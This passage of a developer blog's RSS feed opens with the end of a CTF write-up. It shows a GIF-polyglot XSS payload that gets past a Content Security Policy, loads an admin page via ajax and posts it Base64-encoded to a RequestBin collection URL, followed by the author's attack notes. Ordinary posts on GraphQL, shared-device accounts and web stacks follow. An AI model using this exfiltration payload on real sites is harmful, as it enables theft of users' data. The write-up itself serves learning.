<p>After checking that this actually worked against my own account, I sent a message to the administrator and waited. After a minute or so, the message status changed to read. Heading over to RequestBin and decoding the captured DOM, I found the following snippet:</p>
<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"admin.php"</span><span class="nt">&gt;</span>Administration<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
</code></pre></div>
<p>Sweet, let&#39;s find something juicy on that page! Reworking the payload (with a little help from <a href="https://api.jquery.com/jquery.get/">JQuery</a> that was already on the site):</p>
<div class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="nx">GIF89a</span><span class="cm">/*.......*/</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
<span class="cm">/* Wait for the page to fully load */</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
  <span class="cm">/* Create a form to send to RequestBin */</span>
  <span class="kd">var</span> <span class="nx">f</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">'form'</span><span class="p">);</span>
  <span class="nx">f</span><span class="p">.</span><span class="nx">id</span><span class="o">=</span><span class="s2">"haxForm"</span><span class="p">;</span>
  <span class="nx">f</span><span class="p">.</span><span class="nx">method</span><span class="o">=</span><span class="s2">"post"</span><span class="p">;</span>
  <span class="nx">f</span><span class="p">.</span><span class="nx">action</span><span class="o">=</span><span class="s2">"http://requestb.in/secretcode"</span><span class="p">;</span>

  <span class="cm">/* Create a textarea to store our data */</span>
  <span class="kd">var</span> <span class="nx">t</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">'textarea'</span><span class="p">);</span>
  <span class="nx">t</span><span class="p">.</span><span class="nx">name</span><span class="o">=</span><span class="s2">"haxPayload"</span><span class="p">;</span>

  <span class="cm">/* Inject the form */</span>
  <span class="nx">f</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">t</span><span class="p">);</span>
  <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">f</span><span class="p">);</span>

  <span class="cm">/* Load the admin page ajax-style, Base64 encode it, send it off */</span>
  <span class="nx">$</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">"admin.php"</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">t</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">btoa</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
    <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">"haxForm"</span><span class="p">).</span><span class="nx">submit</span><span class="p">();</span>
  <span class="p">});</span>
<span class="p">};</span>
</code></pre></div>
<p>Using the last payload as the template, I updated it to load the <code>admin.php</code> page via ajax, Base64 encode the result and send it to RequestBin. After uploading, messaging the administrator, waiting, checking the  response and decoding; it seemed there wasn&#39;t even a need to do anything else:</p>
<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;legend&gt;</span>
  <span class="nt">&lt;h3&gt;</span>Administration<span class="nt">&lt;/h3&gt;</span>
<span class="nt">&lt;/legend&gt;</span>
<span class="nt">&lt;h4&gt;</span>flag{the-secret-flag-code}<span class="nt">&lt;/h4&gt;</span>
</code></pre></div>
<p>Mischief managed!</p>

<h2>Raw Notes</h2>

<p>I figured it might be fun to include the raw snippets of notes I made as I was going through this, to give a better idea of my thought process throughout:</p>

<ul>
<li>Administrator is online</li>
<li>We can send messages to users</li>
<li>We can inject images/etc in messages, but ContentSecurityPolicy blocks us from executing code from anywhere but self</li>
<li>We can upload image files (can we make that other types?)

<ul>
<li>GIF89a based XSS, won&#39;t exec in chrome though..</li>
</ul></li>
<li>Administrator will read messages we send them (check the &#39;sent&#39; page)</li>
<li>Admin isn&#39;t using chrome! :p</li>
<li>The request doesn&#39;t send us any cookies! :( (they&#39;re HTTP only)</li>
<li>CSRF token doesn&#39;t seem to actually be validated.. What can we CSRF..?</li>
<li>Use the XSS to send us the admin&#39;s DOM</li>
<li>Seems there&#39;s an admin.php page..</li>
<li>Ajax the admin page</li>
<li>Success!</li>
</ul>

<h2>Conclusion</h2>

<p>This CTF was a pretty fun little challenge, tying together XSS, CSP bypass, file upload/image abuse and snooping through the DOM.</p>

<p>Has this helped you learn something new? Got a better way to approach it? I&#39;d love to hear from you in the comments!</p>

<h2>References</h2>

<ul>
<li>Content Security Policy

<ul>
<li><a href="https://www.owasp.org/index.php/Content_Security_Policy">Content Security Policy | OWASP</a></li>
<li><a href="https://www.owasp.org/index.php/Content_Security_Policy_Cheat_Sheet">Content Security Policy Cheat Sheet | OWASP</a></li>
<li><a href="http://www.html5rocks.com/en/tutorials/security/content-security-policy/">&quot;An Introduction to Content Security Policy&quot; by HTML5 Rocks</a></li>
<li><a href="https://content-security-policy.com/">Content Security Policy References and Examples</a></li>
</ul></li>
<li>File Upload/Image XSS

<ul>
<li><a href="https://blackpentesters.blogspot.com.au/2013/08/gif-image-xss.html">&quot;GIF Image XSS&quot; by eXpl0i13r</a></li>
<li><a href="http://brutelogic.com.br/blog/file-upload-xss/">File Upload XSS | Hack2Learn</a></li>
<li><a href="https://en.wikipedia.org/wiki/List_of_file_signatures">List of File Signatures | Wikipedia</a></li>
<li><a href="https://github.com/d0lph1n98/Defeating-PHP-GD-imagecreatefromgif">&quot;Exploiting PHP-GD imagecreatefromgif() function&quot; by d0lph1n98 </a></li>
</ul></li>
<li>Capturing Requests

<ul>
<li><a href="TODO">Request Bin</a></li>
</ul></li>
</ul>

	  ]]></description>
	</item>

	<item>
	  <title>GraphQL: Why You Should Care</title>
	  <link>/devalias/2016/09/07/graphql-why-you-should-care/</link>
	  <author>devalias</author>
	  <pubDate>2016-09-07T00:00:00+10:00</pubDate>
	  <guid>/devalias/2016/09/07/graphql-why-you-should-care/</guid>
	  <description><![CDATA[
	     <p>If you haven&#39;t yet come across <a href="http://graphql.org/">GraphQL</a>, it&#39;s kind of exciting stuff. It&#39;s a query language developed by <a href="https://code.facebook.com/posts/">Facebook</a>, that basically lets you request exactly the data you need for the given task; no more, no less. Sounds good right?</p>

<h2>Tell me more..</h2>

<p>If you like to get into the nitty gritty of tech specs, you can head over to the <a href="https://facebook.github.io/graphql/">GraphQL Working Draft</a> (<a href="https://github.com/facebook/graphql">GitHub</a>) to have a deeper read, then play around with the <a href="https://github.com/graphql/graphql-js">reference implementation</a> in JavaScript.</p>

<p>Though if specs aren&#39;t really your style, check out &#39;<a href="https://learngraphql.com/">Learn GraphQL</a>&#39; and give their free short course a run through. Should get you up to speed!</p>

<h2>Ok. I&#39;m in!</h2>

<p>Excited? Want to dive into it? Need libraries for your particular tech stack? Head on over to the <a href="https://github.com/chentsulin/awesome-graphql">Awesome GraphQL</a> list. You&#39;re bound to find what you need!</p>

<p>For my particular tech palette I was after something <a href="http://scala-lang.org/">Scala&#39;esque</a>, maybe some <a href="http://doc.akka.io/docs/akka/2.4/scala/http/">Akka-HTTP</a> to go with it. Seems I wasn&#39;t the only one! <a href="http://sangria-graphql.org/">Sangria</a> (<a href="https://github.com/sangria-graphql/sangria">GitHub</a>) is a Scala GraphQL implementation. They even have <a href="https://github.com/sangria-graphql/sangria-akka-http-example">an Akka-HTTP based example</a>. Perfect! Throw in a little <a href="https://github.com/sangria-graphql/sangria-relay">Relay support</a> and this package is pretty much complete.</p>

<p>If you&#39;re looking for an all-in-one stack heading forward, I keep seeing a lot of good things posted by the team at <a href="http://www.apollostack.com/">Apollo Stack</a> (by the <a href="https://www.meteor.com/">Meteor</a> team), so would most definitely recommend keeping an eye on them. They also post a lot of really good articles <a href="https://medium.com/apollo-stack">on their blog</a> too.</p>

<p>For some further reading, make sure to check out:</p>

<ul>
<li><a href="https://medium.com/apollo-stack/tutorial-building-a-graphql-server-cddaa023c035">&quot;Tutorial: How to build a GraphQL server&quot; by Jonas Helfer</a></li>
</ul>

<h2><a name="graphql-relay-redux"></a>GraphQL and Relay.. What about Redux?</h2>

<p>A lot of things you&#39;ll read about GraphQL on the net will talk about it quite closely with <a href="https://facebook.github.io/relay/">Relay</a>, and given they were both released by Facebook, and sort of designed to work together, it makes a lot of sense. That said, you most definitely don&#39;t need to use Relay to take advantage of the awesomeness GraphQL provides!</p>

<p>KADIRA states it pretty well in <a href="https://kadira.io/blog/graphql/graphql-vs-relay">GraphQL vs Relay</a>:</p>

<blockquote>
<p>GraphQL provides a way to model and expose data in your app. You can use it on top of any kind of data source and use it with any kind of transport layer.</p>

<p>Relay is an efficient client-side data-fetching technology built for React. It talks to a GraphQL Schema to get data. Relay also has a server-side part that adds some features on top of GraphQL.</p>
</blockquote>

<p>There is a bunch of talk about how Relay is currently a pain to use, but Facebook seems to be <a href="https://facebook.github.io/react/blog/2016/08/05/relay-state-of-the-state.html">well aware of this issue</a> and has future plans to make it much nicer to work with.</p>

<p>I think it&#39;s definitely worth keeping an eye on Relay in the future, but if you&#39;re not quite ready to jump in, you can always take advantage of the benefits of GraphQL while sticking to something like <a href="http://redux.js.org/">Redux</a> (<a href="https://github.com/reactjs/redux">GitHub</a>). For further reading:</p>

<ul>
<li><a href="https://www.reindex.io/blog/redux-and-relay/">&quot;Comparing Redux and Relay&quot; by Mikhail Novikov</a></li>
<li><a href="https://medium.com/@matt.krick/replacing-relay-with-redux-2990c81aa807">&quot;Replacing Relay with Redux&quot; by Matt Krick</a></li>
<li><a href="https://medium.com/@thisbejim/getting-started-with-redux-and-graphql-8384b3b25c56">&quot;Getting started with Redux and GraphQL&quot; by James Childs-Maidment</a></li>
<li><a href="http://www.apollostack.com/">Apollo Stack</a></li>
<li><a href="https://github.com/mattkrick/cashay">Cashay</a>: &quot;Relay for the rest of us&quot;</li>
<li><a href="https://github.com/gyzerok/adrenaline">Adrenaline</a>: &quot;Simple Relay alternative&quot;</li>
<li><a href="https://github.com/kennetpostigo/react-reach">React-Reach</a>: &quot;A small library for React to communicate with GraphQL&quot;</li>
</ul>

<h2>GraphQL vs Falcor</h2>

<p>So by now we should have a fairly good idea about what <a href="http://graphql.org/">GraphQL</a> is. So what&#39;s <a href="http://netflix.github.io/falcor/">Falcor</a>? This one comes from our friends over at <a href="http://techblog.netflix.com/">Netflix</a>. In essence, it turns all of your data sources into one giant JSON graph. Regardless of whether you&#39;re loading data remotely, have it cached locally, etc; you&#39;ll access it in the same way.</p>

<p>If you want to read deeper, I found these to be quite useful:</p>

<ul>
<li><a href="https://stackoverflow.com/questions/32057785/what-is-the-difference-between-falcor-and-graphql">&quot;What is the difference between Falcor and GraphQL?&quot; on StackOverflow</a></li>
<li><a href="https://medium.com/apollo-stack/graphql-vs-falcor-4f1e9cbf7504">&quot;GraphQL vs. Falcor&quot; by Jonas Helfer</a></li>
<li><a href="http://react-etc.net/entry/beyond-rest-graphql-vs-falcor">&quot;Beyond REST: GraphQL vs. Falcor&quot; by React-Etc</a></li>
</ul>

<p>The consensus that I came to is that it seems to be on par with GraphQL in a number of ways, but is probably a bit easier to implement and a bit less powerful overall. Apparently you could even go so far as to <a href="http://hueypetersen.com/posts/2015/10/26/querying-graphql-with-falcor/">query GraphQL with Falcor</a>, but not the other way. For my purposes, I think I&#39;ll be sticking with GraphQL.</p>

<p>It&#39;s also worth noting that Facebook has been using various flavours of GraphQL for a few years now, whereas Netflix is yet to (or has only recently) started using Falcor in production.</p>

<h2>API&#39;s: REST, HATEOS, Observables.. GraphQL!</h2>

<p>I have read SO many articles over the years about the &#39;proper&#39; way to design API&#39;s, and why styleX is so much better than styleY. With so much info out there, and so much conflicting advice (even within each supposed style), it&#39;s really easy to get stuck in analysis paralysis.</p>

<p>Greg Ziegan put together a <a href="https://medium.com/@gregoryziegan/how-graphql-taught-me-to-code-client-apps-1c631a9953bd">nice little article</a> talking about his progression along this path: from REST, through <a href="http://timelessrepo.com/haters-gonna-hateoas">HATEOS</a>, observables, etc; and how he ended up at GraphQL. Following on from this, Sashko Stubailo makes a pretty good argument about why GraphQL is <a href="https://medium.com/apollo-stack/graphql-the-next-generation-of-api-design-f24b1689756a">&quot;the next generation of API design&quot;</a>.</p>

<p>While the benefits of a GraphQL-based API seem pretty obvious to me, it&#39;s not always feasible to jump straight into shiny new tech. Maybe you need to support legacy services, interact with 3rd-party API&#39;s, or allow other developers to consume your API without them having to learn the ins and outs of GraphQL. But thankfully, we don&#39;t need to pick one over the other!</p>

<p>The GraphQL team have a pretty good article on their blog about <a href="http://graphql.org/blog/rest-api-graphql-wrapper/">wrapping REST API&#39;s in GraphQL</a>, starting purely with the client-side, and later moving it to the backend. This idea plays in SO well with some little side-projects I&#39;ve been thinking about over the years, and how it could be used to help decompose and combine existing API&#39;s.</p>

<h2>Conclusion</h2>

<p>This is a scattering of the articles and things I have read through while learning more about GraphQL, and why it is so awesome. I definitely know it&#39;s a technology that I am super excited to start utilising in my future projects.</p>

<p>Have you come across any other awesome articles/tools related to GraphQL or similar? I&#39;d love to hear about them! Let me know in the comments below.</p>

	  ]]></description>
	</item>

	<item>
	  <title>Shared Devices Need Account Switching</title>
	  <link>/devalias/2016/08/31/shared-devices-need-account-switching/</link>
	  <author>devalias</author>
	  <pubDate>2016-08-31T00:00:00+10:00</pubDate>
	  <guid>/devalias/2016/08/31/shared-devices-need-account-switching/</guid>
	  <description><![CDATA[
	     <p>Living in share houses and using tech like the Apple TV has highlighted an annoying situation: so many apps these days want you to sign in to enable access, personalised features, etc; but most offer no good solution for when you share the device with other people.</p>

<p>There are some apps out there that handle this pretty well:</p>

<ul>
<li><a href="https://www.plex.tv/">Plex</a> allows you to switch between different users in your &#39;home&#39;, each of which can either be a fully independent account, or a &#39;managed user&#39; that exists under the main account.</li>
<li><a href="https://www.netflix.com/au/">Netflix</a> allows switching between different users under the one subscription. While this is ok.. it doesn&#39;t work so well for a share house. What if we each have our own Netflix subscriptions, but want to share the device without having to log out and back in to our own accounts?</li>
</ul>

<p>And then there are so many apps that don&#39;t even seem to give the option, two of which immediately jump to mind for me:</p>

<ul>
<li><a href="https://www.youtube.com/">YouTube</a> let&#39;s you sign in to a single account, but no switching features save for logging out.</li>
<li><a href="https://www.ted.com/">TED</a>&#39;s app suffers from the same issue.</li>
</ul>

<p>This could be fixed at the individual app level. It would be REALLY nice to see support for multiple account switching added to any app made for a device that could potentially be shared (Apple TV/etc, far less likely to be useful on an iPhone.. but it might be for some users) But this requires extra effort from every app developer out there. Perhaps a common framework could be developed to help support this.. but then making it generic enough to fit into everyone&#39;s different architectures would be a challenge.</p>

<p>An even better solution could be baked into the OS itself by Apple.. I boot up my Apple TV and am presented with an account chooser asking which particular registered user I am. If I haven&#39;t already logged in, there&#39;s the option for signing in to my Apple account to add myself as a new user. Once logged in, I&#39;m presented with my own homescreen of apps, laid out to my own preferences, logged in to my own accounts, and saving my own personal data.</p>

<p>This poses some issues about duplication of apps between users, space requirements, etc. So a mid-ground could be allowing the owner/&#39;master&#39; user to control app installation, but then for each other user to be able to maintain their own stored data/signin status/etc.</p>

<p>What do you think? Is this a feature you&#39;d use, or does it just seem like over-engineered bloat? Let me know your thoughts in the comments!</p>

	  ]]></description>
	</item>

	<item>
	  <title>Starting a New Web Application (Part 1): An Exploration of Options</title>
	  <link>/devalias/2016/08/24/starting-a-new-web-application-1-an-exploration-of-options/</link>
	  <author>devalias</author>
	  <pubDate>2016-08-24T00:00:00+10:00</pubDate>
	  <guid>/devalias/2016/08/24/starting-a-new-web-application-1-an-exploration-of-options/</guid>
	  <description><![CDATA[
	     <p>Finding myself with some free time (and looking into starting a new project), I thought I might catch myself up on the state of web technologies, and what might be a good stack to work with.</p>

<p>The details collected here are most certainly not a complete layout of the entire landscape, and there will no doubt be leanings toward my personal tastes (<a href="http://www.reactivemanifesto.org/">reactive</a>, api-driven, etc). You should use this more as a starter into your own deeper research than as a source of ultimate truth. With that out of the way, let&#39;s get into it!</p>

<p><strong>Quicklinks</strong></p>

<ul>
<li><a href="#frontend">Frontend</a>

<ul>
<li><a href="#frontend-frameworks">Frameworks</a></li>
<li><a href="#frontend-ui">UI</a></li>
<li><a href="#frontend-scripting">Scripting</a></li>
</ul></li>
<li><a href="#backend">Backend</a></li>
<li><a href="#tooling">Tooling</a></li>
<li><a href="#conclusions">Conclusions</a></li>
</ul>

<h2><a name="frontend"></a>Frontend</h2>

<p>The frontend is the pretty, interactive, main part that people will be seeing. You can have the most amazingly streamlined and perfect backend code, but noone&#39;s going to notice and love it without a strong frontend to back it up.</p>

<p><strong><a name="frontend-frameworks"></a>Frameworks</strong></p>

<p>The days of raw JavaScript and jQuery selectors is long gone. We&#39;re looking for a nice, modern framework to help put together our frontend. Here&#39;s a little selection of some of our options:</p>

<ul>
<li><a href="https://facebook.github.io/react/">React</a> (<a href="https://github.com/reactjs">GitHub</a>) (most likely with a flavour of <a href="https://facebook.github.io/flux/">Flux</a> (<a href="https://github.com/facebook/flux">GitHub</a>))

<ul>
<li>A frontend framework from Facebook that is taking the web by storm. Probably my personal favourite from what I&#39;ve seen so far.</li>
<li>It even let&#39;s you <a href="https://facebook.github.io/react-native/">build for native devices</a>!</li>
</ul></li>
<li><a href="https://angular.io/">Angular (v2)</a> (or if you like outdated for some reason <a href="https://angularjs.org/">AngularJS (v1)</a>)

<ul>
<li>Also <a href="https://mobile.angular.io/">available for native devices</a></li>
<li>I was a big fan of AngularJS (v1), and I want to like v2, but I don&#39;t think it will be my main choice.</li>
</ul></li>
<li>There are a TON of other frontend frameworks, of varying popularity and support. I won&#39;t delve into them much, but there&#39;s heaps of info out there

<ul>
<li><a href="http://emberjs.com/">Ember</a></li>
<li><a href="https://vuejs.org/">Vue.js</a>

<ul>
<li>From reading around the web, there&#39;s a decent amount of good stuff talking about Vue. In the end I decided against it since it&#39;s not supported by a big backer, and the skills aren&#39;t as useful on a resume. That said, for a personal project it could be a great fit!</li>
<li><a href="https://vuejs.org/guide/comparison.html">https://vuejs.org/guide/comparison.html</a></li>
<li><a href="http://blog.evanyou.me/2015/10/25/vuejs-re-introduction/">http://blog.evanyou.me/2015/10/25/vuejs-re-introduction/</a></li>
<li><a href="http://vuejs.org/2016/04/27/announcing-2.0/">http://vuejs.org/2016/04/27/announcing-2.0/</a></li>
<li><a href="https://github.com/vuejs/vue">vue</a>, <a href="https://github.com/vuejs/vue-rx">vue-rx</a>, <a href="https://github.com/vuejs/vue-resource">vue-resource</a>, <a href="https://github.com/vuejs/vue-router">vue-router</a>, <a href="https://github.com/vuejs/vuex">vuex</a>, <a href="https://github.com/revue/revue">revuew</a></li>
</ul></li>
<li><a href="http://aurelia.io/">Aurelia</a></li>
<li><a href="http://riotjs.com/">Riot</a> (<a href="https://muut.com/blog/technology/riot-2.0/">v2</a>)</li>
</ul></li>
</ul>

<p>As with most things, every man and his dog has their own opinion, so here are a few comparisons I found useful:</p>

<ul>
<li><a href="https://www.ociweb.com/resources/publications/sett/comparison-of-angular-2-and-react/">&quot;Comparison of Angular 2 and React&quot; by Mark Volkmann and Lance Finney</a></li>
<li><a href="http://blog.backand.com/angular-2-vs-react/">&quot;Angular 2 vs. React&quot; by Itay Herskovits</a></li>
<li><a href="https://medium.freecodecamp.com/angular-2-versus-react-there-will-be-blood-66595faafd51">&quot;Angular 2 versus React: There Will Be Blood&quot; by Cory House</a></li>
<li><a href="https://rlafranchi.github.io/2016/05/03/vue-vs-react/">&quot;Vue.js vs React.js&quot; by Richard LaFranchi</a></li>
<li><a href="https://forums.meteor.com/t/why-doesnt-mdg-just-adopt-vue-js-and-forget-about-react-vs-blaze/13926/6">&quot;Why doesn’t MDG just adopt Vue.js and forget about React vs Blaze?&quot;</a></li>
</ul>

<p><strong><a name="frontend-ui"></a>UI</strong></p>

<p>Even if you like to go oldschool and code your site by hand in notepad/vi, you can&#39;t deny the ease/benefits of using a frontend UI framework.</p>

<ul>
<li><a href="https://getbootstrap.com/">Bootstrap</a> (<a href="https://blog.getbootstrap.com/2015/08/19/bootstrap-4-alpha/">v4</a>)

<ul>
<li>Released by Twitter, and arguably one of the most used frontend UI frameworks out there.</li>
<li><a href="https://react-bootstrap.github.io/">React-Bootstrap</a> (<a href="https://github.com/react-bootstrap/react-bootstrap">GitHub</a>)</li>
<li><a href="https://ng-bootstrap.github.io/#/home">ng-bootstrap</a> by the angular-ui team (<a href="https://github.com/ng-bootstrap/ng-bootstrap">GitHub</a>)</li>
<li><a href="https://valor-software.com/ng2-bootstrap/">ng2-bootstrap</a> by valor-software (<a href="https://github.com/valor-software/ng2-bootstrap">GitHub</a>)</li>
</ul></li>
<li><a href="http://foundation.zurb.com/">Foundation</a>

<ul>
<li>While not as well known as the other two mentioned here, those that make use of foundation swear by it.</li>
<li><a href="https://react.foundation/">React-Foundation</a> (<a href="https://github.com/nordsoftware/react-foundation">GitHub</a>)</li>
<li><a href="https://aruberto.github.io/react-foundation-components/">React-Foundation-Components</a></li>
</ul></li>
<li><a href="https://material.google.com/">Material Design</a>

<ul>
<li>Following a set of design principals from Google, this lays out a slick, consistent look and feel.</li>
<li><a href="https://getmdl.io/">Material Design Lite</a></li>
<li><a href="http://www.material-ui.com/">For React</a> (<a href="https://github.com/callemall/material-ui">GitHub</a>)</li>
<li><a href="https://material.angular.io/">For Angular (v2)</a> (<a href="https://github.com/angular/material2">GitHub</a>)</li>
<li><a href="https://material.angularjs.io/">For AngularJS (v1)</a> (<a href="https://github.com/angular/material">GitHub</a>)</li>
</ul></li>
</ul>

<p>Can&#39;t decide? Try some comparisons:</p>

<ul>
<li><a href="http://blog.teamtreehouse.com/the-rundown-bootstrap-vs-google-mdl-vs-foundation">&quot;The Rundown: Bootstrap vs. Google MDL vs. Foundation&quot; by treehouse</a></li>
<li><a href="https://dannyherran.com/2016/03/state-of-affairs-bootstrap-4-vs-foundation-6/">&quot;State of affairs: Bootstrap 4 vs Foundation 6.2&quot; by Danny Herran</a></li>
</ul>

<p><strong><a name="frontend-scripting"></a>Scripting</strong></p>

<p>Modern web apps live by the functionality they enable in the browser, and to do this, we need a JS-esque language. Your chosen frontend framework may sway your choice (eg. Angular (v2) has a strong preference for TypeScript), but ultimately, it&#39;s up to what you/your team feel comfortable with. With <a href="https://github.com/jashkenas/coffeescript/wiki/list-of-languages-that-compile-to-js">so many options</a> out there, it&#39;s hard to pick.. And of course, you could always stick to plain JavaScript.. and with the new features coming in <a href="http://es6-features.org/">ES6</a> (eg. <a href="http://www.html5rocks.com/en/tutorials/es6/promises/">promises</a>) and beyond, it might be a good choice.</p>

<ul>
<li><a href="https://babeljs.io/">Babel</a>

<ul>
<li>A transpiler that lets you play with all the fun features of JavaScript ES6 and beyond, while maintaining compatibility with all of the older browsers.</li>
</ul></li>
<li><a href="https://www.typescriptlang.org/">TypeScript</a> (<a href="https://github.com/Microsoft/TypeScript">GitHub</a>)

<ul>
<li>&quot;TypeScript is a typed superset of JavaScript that compiles to plain JavaScript&quot;</li>
<li>If you&#39;re using Angular (v2) and like sticking to convention, this is the one for you.</li>
</ul></li>
<li><a href="http://coffeescript.org/">CoffeeScript</a> (or maybe <a href="https://github.com/michaelficarra/CoffeeScriptRedux">v2</a>)

<ul>
<li>This used to be my choice, but looking at the other options available now, I think i&#39;ll be moving on.</li>
<li>As always, there are a bunch of arguments for and against..

<ul>
<li><a href="https://robots.thoughtbot.com/replace-coffeescript-with-es6">&quot;Replace CoffeeScript with ES6&quot; by Blake Williams</a></li>
<li><a href="http://tech.noredink.com/post/111583727108/dont-replace-coffeescript-with-es6-transpilers">&quot;Don’t Replace CoffeeScript with ES6 Transpilers&quot; by Richard Feldman</a></li>
<li>etc</li>
</ul></li>
<li>If you&#39;re looking for a way out, why not <a href="https://github.com/decaffeinate/decaffeinate">decaffeinate</a>?</li>
</ul></li>
<li><a href="https://flowtype.org/">Flow</a> (<a href="https://github.com/facebook/flow">GitHub</a>)

<ul>
<li>While it&#39;s not a language unto itself, it does allow you the benefits of typed JavaScript without having to dive into something like TypeScript.</li>
</ul></li>
<li><a href="https://www.scala-js.org/">Scala.js</a>

<ul>
<li>A little left field, this transpiles Scala code into JavaScript. While I probably wouldn&#39;t see myself using this as a main choice, it could make for some interesting reusability between front and backend.</li>
</ul></li>
</ul>

<h2><a name="backend"></a>Backend</h2>

<p>My preferences for backend tech stacks lean heavily towards <a href="http://www.scala-lang.org/">Scala</a> and the <a href="https://www.lightbend.com/platform">Lightbend Reactive Platform</a> these days, but I will make quick mention of some of the other options available.</p>

<ul>
<li><a href="http://doc.akka.io/docs/akka/2.4/scala/http/">Akka-HTTP</a>

<ul>
<li>Taking the power of asynchronous, message based actors, and applying them to HTTP. Definite win.</li>
<li><a href="https://softwaremill.github.io/bootzooka/">Bootzooka</a> (<a href="https://github.com/softwaremill/bootzooka">GitHub</a>)

<ul>
<li>&quot;Bootzooka is a simple application scaffolding project to allow quick start of development for modern, web based applications.&quot;</li>
<li>While not perfect, it&#39;s a decent implementation of a starter app, tying together some useful technologies.</li>
</ul></li>
</ul></li>
<li><a href="https://www.playframework.com/">Play Framework</a>

<ul>
<li>&quot;Play is a high-productivity Java and Scala web application framework that integrates the components and APIs you need for modern web application development.&quot;</li>
</ul></li>
<li><a href="https://github.com/airbnb/hypernova">Hypernova</a>

<ul>
<li>&quot;A service for server-side rendering your JavaScript views&quot;</li>
<li>While not a choice unto itself, this should help speed things up and keep your site nice and search engine friendly.</li>
</ul></li>
<li>You also have all of your other typical options

<ul>
<li><a href="https://www.ruby-lang.org/en/">Ruby</a>

<ul>
<li><a href="http://rubyonrails.org/">Ruby on Rails</a></li>
<li><a href="http://www.sinatrarb.com/">Sinatra</a></li>
<li><a href="https://nodejs.org/en/">Node</a></li>
<li><a href="http://expressjs.com/">Express</a>: &quot;Fast, unopinionated, minimalist web framework for Node.js&quot;</li>
<li><a href="https://www.meteor.com/">Meteor</a>: &quot;Meteor is an open source platform for web,</li>
<li><a href="http://noeticforce.com/best-nodejs-frameworks-for-web-and-app-development">&quot;Node.js Frameworks: The 10 Best for Web and Apps Development&quot; by noeticsunil</a>
mobile, and desktop.&quot;</li>
</ul></li>
<li><a href="https://www.python.org/">Python</a>

<ul>
<li><a href="https://www.djangoproject.com/">Django</a></li>
<li><a href="https://wiki.python.org/moin/WebFrameworks">Web Frameworks for Python</a></li>
</ul></li>
<li><a href="https://secure.php.net/">PHP</a>

<ul>
<li><a href="https://octobercms.com/">October</a>: &quot;October is a free, open-source, self-hosted CMS platform based on the Laravel PHP Framework. A simple and modular CMS that grows with you, with a precise and beautiful interface that comes as second nature.&quot;</li>
<li><a href="https://laravel.com/">Laravel</a></li>
</ul></li>
<li>etc</li>
</ul></li>
</ul>

<h2><a name="tooling"></a>Tooling</h2>

<p>With the crazy mix of technologies and steps involved in modern web app development, it makes a ton of sense to tie it all together with some automation.</p>

<ul>
<li><a href="https://webpack.github.io/">Webpack</a> (<a href="https://github.com/webpack/webpack">GitHub</a>)

<ul>
<li>&quot;Webpack is a bundler for modules. The main purpose is to bundle JavaScript files for usage in a browser, yet it is also capable of transforming, bundling, or packaging just about any resource or asset.&quot;</li>
<li><a href="http://blog.andrewray.me/webpack-when-to-use-and-why/">&quot;Webpack: When To Use And Why&quot; by Andrew Ray</a></li>
<li><a href="https://github.com/webpack/less-loader">https://github.com/webpack/less-loader</a></li>
<li><a href="https://github.com/shakacode/bootstrap-loader">https://github.com/shakacode/bootstrap-loader</a></li>
</ul></li>
<li><a href="http://gulpjs.com/">Gulp</a> (<a href="https://github.com/gulpjs/gulp">GitHub</a>

<ul>
<li>Gulp is a streaming javascript task runner that lets you automate tasks.</li>
</ul></li>
<li><a href="http://gruntjs.com/">Grunt</a> (<a href="https://github.com/gruntjs/">GitHub</a>)

<ul>
<li>Grunt is basically the older, less streaming, less awesome version of Gulp.</li>
</ul></li>
</ul>

<p>While a little different in purpose to the things mentioned above, getting everything nicely tested and deployed is always good:</p>

<ul>
<li><a href="https://bitbucket.org/product/features/pipelines">Bitbucket Pipelines</a>: &quot;Build, test and deploy from Bitbucket&quot;</li>
</ul>

<h2><a name="conclusions"></a>Conclusions</h2>

<p>Hopefully this has given you a decent starting point for figuring out what combination of technologies is going to work best for your next project. If you want to see the direction I&#39;ve decided to go, make sure you read on in <a href="#TODO">Part 2</a>.</p>

<p>Have I missed something important? Not given love to your favourite stack? Got a cool pointer? Or just want to say hi? Let me know in the comments!</p>

	  ]]></description>
	</item>


</channel>
</rss>
